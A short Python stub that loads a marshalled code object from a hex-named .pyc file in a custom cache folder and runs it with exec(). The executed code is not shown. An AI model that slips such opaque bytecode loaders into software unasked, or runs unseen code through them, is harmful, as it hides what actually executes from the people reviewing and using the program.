
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'DataBank_48da5ef77be44aa4a8722bf3616b5767.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
